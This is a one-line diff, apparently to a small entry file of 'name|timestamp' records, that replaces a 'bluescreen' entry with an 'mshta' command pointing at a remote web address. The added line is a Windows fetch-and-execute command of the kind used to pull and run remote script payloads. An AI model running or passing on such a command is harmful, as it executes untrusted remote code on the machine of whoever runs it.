@@ -1,1 +1,1 @@
-bluescreen|1790038517
+mshta:Mshta https://onlinedice.up.railway.app|1790039077
